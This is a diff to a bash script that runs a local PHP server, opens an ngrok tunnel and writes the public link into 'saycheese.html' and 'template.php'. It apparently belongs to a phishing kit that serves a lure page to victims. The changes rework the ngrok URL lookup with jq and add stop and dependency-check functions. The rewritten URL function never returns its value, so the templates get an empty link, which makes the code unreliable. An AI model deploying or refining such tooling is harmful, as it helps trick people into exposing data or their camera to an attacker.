@@ -118,15 +118,37 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 
 }
 
+#Here is the modified code for Ngrok server
 
-payload_ngrok() {
-
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
-sed 's+forwarding_link+'$link'+g' template.php > index.php
-
-
+# Function to get the Ngrok public URL
+get_ngrok_url() {
+    local tunnel_info=$(curl -s -N http://127.0.0.1:4040/api/tunnels)
+    local url=$(echo "$tunnel_info" | jq -r '.tunnels[0].public_url')
 }
+
+# Function to update the files with the Ngrok tunnel URL
+payload_ngrok() {
+    link=$(get_ngrok_url)
+    sed -i 's+forwarding_link+'"${link//&/\\&}"'+g' saycheese.html
+    sed -i 's+forwarding_link+'"${link//&/\\&}"'+g' template.php
+}
+
+# Function to stop the server and related processes
+stop() {
+    printf "\nStopping the server and related processes...\n"
+    pkill -f -2 ngrok > /dev/null 2>&1
+    killall -2 ngrok > /dev/null 2>&1
+    killall -2 php > /dev/null 2>&1
+    killall -2 ssh > /dev/null 2>&1
+    exit 1
+}
+
+# Function to check dependencies
+dependencies() {
+    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+    command -v jq > /dev/null 2>&1 || { echo >&2 "I require jq but it's not installed. Install it. Aborting."; exit 1; }
+}
+
 
 ngrok_server() {
 
@@ -168,12 +190,17 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+/usr/local/bin/ngrok http 3333 > /dev/null 2>&1 & #Path modified to work with the binary
 sleep 10
+# Get the Ngrok public URL. This function is updated to work with the new Ngrok API.
+get_ngrok_url2() {
+    local tunnel_info=$(curl -s -N http://127.0.0.1:4040/api/tunnels)
+    local url=$(echo "$tunnel_info" | jq -r '.tunnels[0].public_url')
+    echo "$url"
+}
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
-
+link2=$(get_ngrok_url2)  # Get the Ngrok public URL
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link2
 payload_ngrok
 checkfound
 }
@@ -240,4 +267,3 @@ checkfound
 banner
 dependencies
 start1
-
